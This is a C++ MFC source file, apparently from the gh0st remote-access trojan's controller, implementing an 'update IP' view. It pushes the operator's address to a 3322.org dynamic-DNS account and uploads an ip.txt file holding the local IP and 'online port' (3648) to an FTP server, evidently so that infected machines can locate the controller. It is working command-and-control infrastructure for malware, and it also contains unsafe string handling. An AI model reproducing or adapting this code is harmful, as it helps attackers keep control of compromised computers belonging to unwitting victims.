// UpIp.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "UpIp.h"
#include<winsock2.h>
#include <wininet.h>
#include <shlwapi.h>
#pragma comment(lib,"shlwapi.lib")
#pragma comment(lib,"WS2_32")
#pragma comment (lib,"Wininet.lib") 
#include "afxinet.h" //WinInet所需要的頭文件


#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif
char url[100],ip[40];
/////////////////////////////////////////////////////////////////////////////
// CUpIp

IMPLEMENT_DYNCREATE(CUpIp, CFormView)

CUpIp::CUpIp()
	: CFormView(CUpIp::IDD)
{
	//{{AFX_DATA_INIT(CUpIp)
	m_FtpIP = _T("");
	m_FtpPort = 21;
	m_Pass = _T("");
	m_User = _T("");
	m_FtpUrl = _T("ip.jpg");
	//}}AFX_DATA_INIT
}

CUpIp::~CUpIp()
{
}

void CUpIp::DoDataExchange(CDataExchange* pDX)
{
	CFormView::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CUpIp)
	DDX_Text(pDX, IDC_FTPIP, m_FtpIP);
	DDX_Text(pDX, IDC_FTPPORT, m_FtpPort);
	DDX_Text(pDX, IDC_PASS, m_Pass);
	DDX_Text(pDX, IDC_USER, m_User);
	DDX_Text(pDX, IDC_FTPURL, m_FtpUrl);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CUpIp, CFormView)
	//{{AFX_MSG_MAP(CUpIp)
	ON_BN_CLICKED(IDC_UPDNSIP, OnUpdnsip)
	ON_BN_CLICKED(IDC_UPFTP, OnUpftp)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CUpIp diagnostics

#ifdef _DEBUG
void CUpIp::AssertValid() const
{
	CFormView::AssertValid();
}

void CUpIp::Dump(CDumpContext& dc) const
{
	CFormView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CUpIp message handlers

void CUpIp::OnUpdnsip() 
{

	CString strUpdateIP       = "希網域名更新";
	CString strSectionKey     = "希網域名";
	char strBuff[256];
	CString strValue       = _T("");
	CString strFilePath;
	char Path[MAX_PATH];
	GetModuleFileName(0,Path,sizeof(Path));
	PathRemoveFileSpec(Path);
	strFilePath.Format("%s\\ini\\UpIp.ini",Path);
	//MessageBox(strFilePath,"ok");
	GetDlgItemText(IDC_DNS,strValue);     //獲取希網域名
	WritePrivateProfileString(strUpdateIP,strSectionKey,strValue,strFilePath);  //寫入ini文件中相應字段
	/*
	strSectionKey="上線IP";
	GetDlgItemText(IDC_IP,strValue);   //獲取上線ip
	WritePrivateProfileString(strUpdateIP,strSectionKey,strValue,strFilePath);
	*/
	strSectionKey="用戶名";
	GetDlgItemText(IDC_DNSID,strValue);   //獲取用戶名
	WritePrivateProfileString(strUpdateIP,strSectionKey,strValue,strFilePath);

	strSectionKey="用戶密碼";
	GetDlgItemText(IDC_DNSPASS,strValue);   //獲取用戶密碼
	WritePrivateProfileString(strUpdateIP,strSectionKey,strValue,strFilePath);

	CString id,pass,dns,ip; 
	char a[256]="http://";
	char *b="@members.3322.org/dyndns/update?system=dyndns&hostname=";
	char *c="&myip=";
	char *d="&wildcard=OFF";
    GetDlgItem(IDC_DNSID)->GetWindowText(id);
	GetDlgItem(IDC_DNSPASS)->GetWindowText(pass);
	GetDlgItem(IDC_DNS)->GetWindowText(dns);
	GetDlgItem(IDC_IP)->GetWindowText(ip);
	strcat(a,id);
	strcat(a,":");
	strcat(a,pass);
	strcat(a,b);
	strcat(a,dns);
	strcat(a,c);
	strcat(a,ip);
	strcat(a,d);
  
	//	 MessageBox(a);
	//"http://xxxx:xxxxx@members.3322.org/dyndns/update?system=dyndns&hostname=xxxxx.3322.org&myip=192.168.0.1&wildcard=OFF"; 

	HINTERNET hNet = ::InternetOpen("3322", //當HTTP協議使用時，這個參數隨意賦值 
	PRE_CONFIG_INTERNET_ACCESS, //訪問類型指示Win32網絡函數使用登記信息去發現一個服務器。 
	NULL, 
	INTERNET_INVALID_PORT_NUMBER, //使用INTERNET_INVALID_PORT_NUMBER相當於提供卻省的端口數。 
	0 //標誌去指示使用返回句句柄的將來的Internet函數將"不"為回調函數發送狀態信息 
	); 

	HINTERNET hUrlFile = ::InternetOpenUrl(hNet, //從InternetOpen返回的句柄 
	(char *)a, //需要打開的URL 
	NULL, //用來向服務器傳送額外的信息,一般為NULL 
	0, //用來向服務器傳送額外的信息,一般為 0 
	INTERNET_FLAG_RELOAD, //InternetOpenUrl行為的標誌 
	0); //信息將不會被送到狀態回調函數 

	char buffer[1024] ; 
	DWORD dwBytesRead = 0; 
	BOOL bRead = ::InternetReadFile(hUrlFile, //InternetOpenUrl返回的句柄 
	buffer, //保留數據的緩衝區 
	sizeof(buffer), 
	&dwBytesRead); //指向包含讀入緩衝區字節數的變量的指針; 
	//如果返回值是TRUE，而且這裡指向0，則文件已經讀到了文件的末尾。 

	::InternetCloseHandle(hUrlFile) ; 
	::InternetCloseHandle(hNet) ; 

    if(buffer>0)
	{
        if(strstr(buffer,"badauth"))
			MessageBox("ID 或 密碼有誤 ...");
		if(strstr(buffer,"good"))
			MessageBox("更新成功 ...\r\n"+ip);
		if(strstr(buffer,"nohost"))
			MessageBox("DNS錯誤 ...\n\r請檢查是否輸入正確");
		if(strstr(buffer,"nochg"))
			MessageBox("請不要反覆更新 ...");
	}
	memset(buffer,0,sizeof(buffer));
}

void CUpIp::OnInitialUpdate() 
{
	CFormView::OnInitialUpdate();
}

void CUpIp::OnUpftp() 
{
	UpdateData(TRUE);

	/////////////////////////////////////////////////////////////////////////////////////////////
/*
	// 保存配置信息

	CString strUpdateIP       = "FTP更新";		//   [FTP更新]
	CString strSectionKey     = "FTP服務器";
	char strBuff[256];
	CString strValue       = _T("");
	CString strFilePath;
	char Path[MAX_PATH];
	GetModuleFileName(0,Path,sizeof(Path));
	PathRemoveFileSpec(Path);
	strFilePath.Format("%s\\ini\\UpIp.ini",Path);
	//MessageBox(strFilePath,"ok");
	GetDlgItemText(IDC_FTPIP,strValue);			//獲取FTP
	WritePrivateProfileString(strUpdateIP,strSectionKey,strValue,strFilePath);  //寫入ini文件中相應字段

	strSectionKey="存放IP的文件";
	GetDlgItemText(IDC_FTPURL,strValue);	    //獲取ip文件
	WritePrivateProfileString(strUpdateIP,strSectionKey,strValue,strFilePath);

	strSectionKey="端口";
	GetDlgItemText(IDC_FTPPORT,strValue);		//獲取端口
	WritePrivateProfileString(strUpdateIP,strSectionKey,strValue,strFilePath);

	strSectionKey="上線端口";
	GetDlgItemText(IDC_LOCALPORT,strValue);		//獲取上線端口
	WritePrivateProfileString(strUpdateIP,strSectionKey,strValue,strFilePath);

	strSectionKey="用戶名";
	GetDlgItemText(IDC_USER,strValue);			//獲取用戶名
	WritePrivateProfileString(strUpdateIP,strSectionKey,strValue,strFilePath);

	strSectionKey="用戶密碼";
	GetDlgItemText(IDC_PASS,strValue);			//獲取用戶密碼
	WritePrivateProfileString(strUpdateIP,strSectionKey,strValue,strFilePath);
*/
	/////////////////////////////////////////////////////////////////////////////////////////////



	//打包本地IP及端口信息為文件------------------
	CString ip,str;
	GetDlgItem(IDC_LOCALIP)->GetWindowText(ip);
	GetDlgItem(IDC_LOCALPORT)->GetWindowText(str);
	ip=ip+":"+str;
	HANDLE hFile;
    hFile = CreateFile("ip.txt", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD numWrite;
    WriteFile (hFile,ip,ip.GetLength(), &numWrite, NULL);	
	CloseHandle(hFile);

	//FTP上傳文件---------------------------------
	CInternetSession *seu;
	CFtpConnection *pFTP;
	   //新建對話
	seu=new CInternetSession(AfxGetAppName(),1,PRE_CONFIG_INTERNET_ACCESS);
	try 
	{ 
		//新建連接對象
		pFTP=seu->GetFtpConnection(m_FtpIP,m_User,m_Pass,m_FtpPort,FALSE); 
	} 
	catch(CInternetException *pEx) 
	{
		//獲取錯誤
		TCHAR szError[1024];
		if(pEx->GetErrorMessage(szError,1024))
			AfxMessageBox(szError);
		else  
			AfxMessageBox("There was an exception");
		pEx->Delete();
		pFTP=NULL;
		return;
	}
    //上傳
	if(pFTP->PutFile("ip.txt",m_FtpUrl))
			AfxMessageBox("刷新IP成功 ...");
    pFTP->Close();
}

void CUpIp::OnActivateView(BOOL bActivate, CView* pActivateView, CView* pDeactiveView) 
{
	////////////////////////////////////////////////////////////////////
/*
	CString strSection       = "FTP更新";
	CString strSectionKey    = "FTP服務器";
	char strBuff[256];
	CString strValue       = _T("");
	CString strFilePath;

	char Path[MAX_PATH];
	GetModuleFileName(0,Path,sizeof(Path));
	PathRemoveFileSpec(Path);
	strFilePath.Format("%s\\ini\\UpIp.ini",Path);

	GetPrivateProfileString(strSection,strSectionKey,NULL,strBuff,500,strFilePath); //讀取ini文件中相應字段的內容
	strValue=strBuff;
	GetDlgItem(IDC_FTPIP)->SetWindowText(strValue);



	//SetDlgItemText(IDC_FTPIP,strValue);

	strSectionKey="存放IP的文件";
	GetPrivateProfileString(strSection,strSectionKey,NULL,strBuff.GetBuffer(MAX_PATH),80,strFilePath);
	strValue=strBuff;
	SetDlgItemText(IDC_FTPURL,strValue);

	strSectionKey="存放IP的文件";
	GetPrivateProfileString(strSection,strSectionKey,NULL,strBuff,80,strFilePath);
	strValue=strBuff;
	SetDlgItemText(IDC_FTPURL,strValue);

	strSectionKey="端口";
	GetPrivateProfileString(strSection,strSectionKey,NULL,strBuff,80,strFilePath);
	strValue=strBuff;
	SetDlgItemText(IDC_FTPPORT,strValue);

	strSectionKey="上線端口";
	GetPrivateProfileString(strSection,strSectionKey,NULL,strBuff,80,strFilePath);
	strValue=strBuff;
	SetDlgItemText(IDC_LOCALPORT,strValue);

	strSectionKey="用戶名";
	GetPrivateProfileString(strSection,strSectionKey,NULL,strBuff,80,strFilePath);
	strValue=strBuff;
	SetDlgItemText(IDC_USER,strValue);

	strSectionKey="用戶密碼";
	GetPrivateProfileString(strSection,strSectionKey,NULL,strBuff,80,strFilePath);
	strValue=strBuff;
	SetDlgItemText(IDC_PASS,strValue);

	UpdateData(FALSE);
*/
	////////////////////////////////////////////////////////////////////



		int	nEditControl1[] = {IDC_DNS};
		for (int i = 0; i < sizeof(nEditControl1) / sizeof(int); i++)
		m_Edit1[i].SubclassDlgItem(nEditControl1[i], this);



	//獲得IP
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2,2),&wsaData);
	char szhostname[128];
    CString str;
	if( gethostname(szhostname, 128) == 0 )
	{
		struct hostent * phost;
		int i=0,j,h_length=4;
		phost = gethostbyname(szhostname);
		for( j = 0; j<h_length; j++ )
		{
			CString addr;			
			if( j > 0 )
				str += ".";			
			addr.Format("%u", (unsigned int)((unsigned char*)phost->h_addr_list[i])[j]);
			str += addr;
		}
	}
    //m_sIPAddress=str;
    WSACleanup();

	GetDlgItem(IDC_FTPPORT)->SetWindowText("21");
	GetDlgItem(IDC_LOCALPORT)->SetWindowText("3648");
	GetDlgItem(IDC_LOCALIP)->SetWindowText(str);
    GetDlgItem(IDC_IP)->SetWindowText(str);
	UpdateData(FALSE);
	CFormView::OnActivateView(bActivate, pActivateView, pDeactiveView);
}

